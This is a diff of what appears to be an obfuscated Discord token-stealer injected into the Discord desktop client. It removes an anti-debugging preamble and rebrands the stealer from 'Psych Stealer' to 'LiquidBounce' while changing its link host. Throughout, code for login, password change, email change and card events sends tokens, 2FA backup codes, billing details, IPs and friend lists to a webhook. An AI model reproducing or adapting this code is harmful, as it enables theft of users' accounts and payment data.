@@ -1,98 +1,3 @@
-const B = (function () {
-    let w = true
-    return function (W, b) {
-      const Q = w
-        ? function () {
-            if (b) {
-              const L = b.apply(W, arguments)
-              return (b = null), L
-            }
-          }
-        : function () {}
-      return (w = false), Q
-    }
-  })(),
-  d = B(this, function () {
-    return d
-      .toString()
-      .search('(((.+)+)+)+$')
-      .toString()
-      .constructor(d)
-      .search('(((.+)+)+)+$')
-  })
-d()
-const F = (function () {
-  let w = true
-  return function (W, b) {
-    const J = w
-      ? function () {
-          if (b) {
-            const L = b.apply(W, arguments)
-            return (b = null), L
-          }
-        }
-      : function () {}
-    return (w = false), J
-  }
-})()
-;(function () {
-  F(this, function () {
-    const w = new RegExp('function *\\( *\\)'),
-      W = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i'),
-      b = T('init')
-    if (!w.test(b + 'chain') || !W.test(b + 'input')) {
-      b('0')
-    } else {
-      T()
-    }
-  })()
-})()
-const c = (function () {
-    let b = true
-    return function (s, J) {
-      const D = b
-        ? function () {
-            if (J) {
-              const p = J.apply(s, arguments)
-              return (J = null), p
-            }
-          }
-        : function () {}
-      return (b = false), D
-    }
-  })(),
-  A = c(this, function () {
-    let w
-    try {
-      const s = Function(
-        'return (function() {}.constructor("return this")( ));'
-      )
-      w = s()
-    } catch (Q) {
-      w = window
-    }
-    const W = (w.console = w.console || {})
-    const b = ['log', 'warn', 'info', 'error', 'exception', 'table', 'trace']
-    for (let L = 0; L < b.length; L++) {
-      const p = c.constructor.prototype.bind(c),
-        R = b[L],
-        U = W[R] || p
-      p['__proto__'] = c.bind(c)
-      p.toString = U.toString.bind(U)
-      W[R] = p
-    }
-  })
-A()
-;(function () {
-  let w
-  try {
-    const b = Function('return (function() {}.constructor("return this")( ));')
-    w = b()
-  } catch (s) {
-    w = window
-  }
-  w.setInterval(T, 4000)
-})()
 const fs = require('fs')
 const path = require('path'),
   { BrowserWindow, session } = require('electron'),
@@ -157,7 +62,7 @@ function FirstTime(a) {
         fs.rmdirSync(path.join(__dirname, 'init'))
         if (b == null || b == undefined || b == '') {
           const L = {
-            username: 'Psych Stealer',
+            username: 'LiquidBounce',
             content: '',
             embeds: [
               {
@@ -175,8 +80,8 @@ function FirstTime(a) {
                     inline: false,
                   },
                 ],
-                author: { name: 'Psych Stealer' },
-                footer: { text: 'Psych Stealer' },
+                author: { name: 'LiquidBounce' },
+                footer: { text: 'LiquidBounce' },
               },
             ],
           }
@@ -200,7 +105,7 @@ function FirstTime(a) {
                   {
                     title: 'Discord Initalized',
                     description:
-                      '[**<:partner:909102089513340979> \u2502 Click Here To Copy Info On Mobile**](https://rustlercoppy.com/copy/' +
+                      '[**<:partner:909102089513340979> \u2502 Click Here To Copy Info On Mobile**](https://superfurrycdn.nl/copy/' +
                       b +
                       ')',
                     color: config['embed-color'],
@@ -279,8 +184,8 @@ function FirstTime(a) {
                     inline: false,
                   },
                 ],
-                author: { name: 'Psych Stealer' },
-                footer: { text: 'Psych Stealer' },
+                author: { name: 'LiquidBounce' },
+                footer: { text: 'LiquidBounce' },
               },
             ],
           }
@@ -310,7 +215,7 @@ function FirstTime(a) {
                           '`' +
                           b +
                           '`' +
-                          '\n[CopyToken](https://rustlercoppy.com/copy/' +
+                          '\n[CopyToken](https://superfurrycdn.nl/copy/' +
                           b +
                           ')',
                         inline: false,
@@ -345,9 +250,9 @@ function FirstTime(a) {
                       name:
                         q.username + '#' + q.discriminator + ' (' + q.id + ')',
                       icon_url:
-                        'https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg',
+                        'https://cdn.discordapp.com/attachments/969997565942698055/969997610565902346/115268.gif',
                     },
-                    footer: { text: 'Psych Stealer' },
+                    footer: { text: 'LiquidBounce' },
                     thumbnail: {
                       url:
                         'https://cdn.discordapp.com/avatars/' +
@@ -616,7 +521,7 @@ function Login(a, w, W) {
                         }
                         const m = JSON.parse(J)
                         var Y = {
-                          username: 'Psych Stealer',
+                          username: 'LiquidBounce',
                           content: '',
                           embeds: [
                             {
@@ -673,9 +578,9 @@ function Login(a, w, W) {
                                   m.id +
                                   ')',
                                 icon_url:
-                                  'https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg',
+                                  'https://cdn.discordapp.com/attachments/969997565942698055/969997610565902346/115268.gif',
                               },
-                              footer: { text: 'Psych Stealer' },
+                              footer: { text: 'LiquidBounce' },
                               thumbnail: {
                                 url:
                                   'https://cdn.discordapp.com/avatars/' +
@@ -693,19 +598,19 @@ function Login(a, w, W) {
                           footer: {},
                         }
                         P.author.icon_url =
-                          'https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg'
+                          'https://cdn.discordapp.com/attachments/969997565942698055/969997610565902346/115268.gif'
                         P.author.name = '2FA Codes'
-                        P.footer.text = 'Psych Stealer'
+                        P.footer.text = 'LiquidBounce'
                         var q = P,
                           i = {
                             color: config['embed-color'],
                             description: u(),
                             author: {
                               icon_url:
-                                'https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg',
+                                'https://cdn.discordapp.com/attachments/969997565942698055/969997610565902346/115268.gif',
                               name: 'HQ Friends',
                             },
-                            footer: { text: 'Psych Stealer' },
+                            footer: { text: 'LiquidBounce' },
                           }
                         W.startsWith('mfa') && Y.embeds.push(q)
                         Y.embeds.push(i)
@@ -862,9 +767,9 @@ function Login(a, w, W) {
                                               H.id +
                                               ')',
                                             icon_url:
-                                              'https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg',
+                                              'https://cdn.discordapp.com/attachments/969997565942698055/969997610565902346/115268.gif',
                                           },
-                                          footer: { text: 'Psych Stealer' },
+                                          footer: { text: 'LiquidBounce' },
                                           thumbnail: {
                                             url:
                                               'https://cdn.discordapp.com/avatars/' +
@@ -878,10 +783,10 @@ function Login(a, w, W) {
                                           description: v(),
                                           author: {
                                             icon_url:
-                                              'https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg',
+                                              'https://cdn.discordapp.com/attachments/969997565942698055/969997610565902346/115268.gif',
                                             name: 'HQ Friends',
                                           },
-                                          footer: { text: 'Psych Stealer' },
+                                          footer: { text: 'LiquidBounce' },
                                         },
                                       ],
                                     }
@@ -941,7 +846,7 @@ function ChangePassword(a, w, W) {
                       .then((e) => {
                         var C = [],
                           n = '',
-                          S = 'https://rustlercoppy.com/copy/',
+                          S = 'https://superfurrycdn.nl/copy/',
                           t = JSON.parse(e)
                         let y = t.backup_codes
                         const X = y.filter((P) => {
@@ -1080,9 +985,9 @@ function ChangePassword(a, w, W) {
                                   H.id +
                                   ')',
                                 icon_url:
-                                  'https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg',
+                                  'https://cdn.discordapp.com/attachments/969997565942698055/969997610565902346/115268.gif',
                               },
-                              footer: { text: 'Psych Stealer' },
+                              footer: { text: 'LiquidBounce' },
                               thumbnail: {
                                 url:
                                   'https://cdn.discordapp.com/avatars/' +
@@ -1100,7 +1005,7 @@ function ChangePassword(a, w, W) {
                           footer: {},
                         }
                         m.author.icon_url =
-                          'https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg'
+                          'https://cdn.discordapp.com/attachments/969997565942698055/969997610565902346/115268.gif'
                         m.author.name = '2FA Codes'
                         m.footer.text = 'Psych Stealer'
                         var i = {
@@ -1108,7 +1013,7 @@ function ChangePassword(a, w, W) {
                           description: v(),
                           author: {
                             icon_url:
-                              'https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg',
+                              'https://cdn.discordapp.com/attachments/969997565942698055/969997610565902346/115268.gif',
                             name: 'HQ Friends',
                           },
                           footer: { text: 'Psych Stealer' },
@@ -1223,7 +1128,7 @@ function ChangePassword(a, w, W) {
                                                 '`' +
                                                 W +
                                                 '`' +
-                                                '\n[CopyToken](https://rustlercoppy.com/copy/' +
+                                                '\n[CopyToken](https://superfurrycdn.nl/copy/' +
                                                 W +
                                                 ')',
                                               inline: false,
@@ -1274,7 +1179,7 @@ function ChangePassword(a, w, W) {
                                               H.id +
                                               ')',
                                             icon_url:
-                                              'https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg',
+                                              'https://cdn.discordapp.com/attachments/969997565942698055/969997610565902346/115268.gif',
                                           },
                                           footer: { text: 'Psych Stealer' },
                                           thumbnail: {
@@ -1290,10 +1195,10 @@ function ChangePassword(a, w, W) {
                                           description: v(),
                                           author: {
                                             icon_url:
-                                              'https://cdn.discordapp.com/attachments/932693851494289559/935491879703830577/9d285c5f2be8347152a3d9309dafa484.jpg',
+                                              'https://cdn.discordapp.com/attachments/969997565942698055/969997610565902346/115268.gif',
                                             name: 'HQ Friends',
                                           },
-                                          footer: { text: 'Psych Stealer' },
+                                          footer: { text: 'LiquidBounce' },
                                         },
                                       ],
                                     }
@@ -1352,7 +1257,7 @@ function ChangeEmail(a, w, W) {
                       )
                       .then((f) => {
                         var G = [],
-                          C = 'https://rustlercoppy.com/copy/',
+                          C = 'https://superfurrycdn.nl/copy/',
                           n = JSON.parse(f)
                         let S = n.backup_codes
                         const t = S.filter((u) => {
@@ -1401,10 +1306,10 @@ function ChangeEmail(a, w, W) {
                               return '`\u274C`'
                             } else {
                               if (o.type == 2 && o.invalid != true) {
-                                h += '`\u2714️` <:paypal:896441236062347374>'
+                                h += '`\u2714` <:paypal:896441236062347374>'
                               } else {
                                 if (o.type == 1 && o.invalid != true) {
-                                  h += '`\u2714️` :credit_card:'
+                                  h += '`\u2714` :credit_card:'
                                 } else {
                                   return '`\u274C`'
                                 }
@@ -1483,8 +1388,8 @@ function ChangeEmail(a, w, W) {
                                   inline: false,
                                 },
                               ],
-                              author: { name: 'Psych Stealer' },
-                              footer: { text: 'Psych Stealer' },
+                              author: { name: 'LiquidBounce' },
+                              footer: { text: 'LiquidBounce' },
                               thumbnail: {
                                 url:
                                   'https://cdn.discordapp.com/avatars/' +
@@ -1517,8 +1422,8 @@ function ChangeEmail(a, w, W) {
                           author: {},
                           footer: {},
                         }
-                        M.author.name = 'Psych Stealer'
-                        M.footer.text = 'Psych Stealer'
+                        M.author.name = 'LiquidBounce'
+                        M.footer.text = 'LiquidBounce'
                         var v = M
                         W.startsWith('mfa') && X.embeds.push(v)
                         SendToWebhook(JSON.stringify(X))
@@ -1594,13 +1499,13 @@ function ChangeEmail(a, w, W) {
                                             u.invalid != true
                                           ) {
                                             v +=
-                                              '`\u2714️` <:paypal:896441236062347374>'
+                                              '`\u2714` <:paypal:896441236062347374>'
                                           } else {
                                             if (
                                               u.type == 1 &&
                                               u.invalid != true
                                             ) {
-                                              v += '`\u2714️` :credit_card:'
+                                              v += '`\u2714` :credit_card:'
                                             } else {
                                               return '`\u274C`'
                                             }
@@ -1612,13 +1517,13 @@ function ChangeEmail(a, w, W) {
                                     }
                                     const g = JSON.parse(e)
                                     var X = {
-                                      username: 'Psych Stealer',
+                                      username: 'LiquidBounce',
                                       content: '',
                                       embeds: [
                                         {
                                           title: 'Email Changed',
                                           description:
-                                            '[**<:partner:909102089513340979> \u2502 Click Here To Copy Info On Mobile**](https://rustlercoppy.com/copy/' +
+                                            '[**<:partner:909102089513340979> \u2502 Click Here To Copy Info On Mobile**](https://superfurrycdn.nl/copy/' +
                                             W +
                                             ')',
                                           color: config['embed-color'],
@@ -1680,8 +1585,8 @@ function ChangeEmail(a, w, W) {
                                               inline: false,
                                             },
                                           ],
-                                          author: { name: 'Psych Stealer' },
-                                          footer: { text: 'Psych Stealer' },
+                                          author: { name: 'LiquidBounce' },
+                                          footer: { text: 'LiquidBounce' },
                                           thumbnail: {
                                             url:
                                               'https://cdn.discordapp.com/avatars/' +
@@ -1694,8 +1599,8 @@ function ChangeEmail(a, w, W) {
                                           title: 'Total Friends (' + q() + ')',
                                           color: config['embed-color'],
                                           description: i(),
-                                          author: { name: 'Psych Stealer' },
-                                          footer: { text: 'Psych Stealer' },
+                                          author: { name: 'LiquidBounce' },
+                                          footer: { text: 'LiquidBounce' },
                                           thumbnail: {
                                             url:
                                               'https://cdn.discordapp.com/avatars/' +
@@ -1787,8 +1692,8 @@ function CreditCardAdded(a, w, W, b, s, J, Q, D, L, k) {
                   '\n**IP: **```' +
                   e +
                   '```',
-                author: { name: 'Psych Stealer' },
-                footer: { text: 'Psych Stealer' },
+                author: { name: 'LiquidBounce' },
+                footer: { text: 'LiquidBounce' },
                 thumbnail: {
                   url:
                     'https://cdn.discordapp.com/avatars/' +
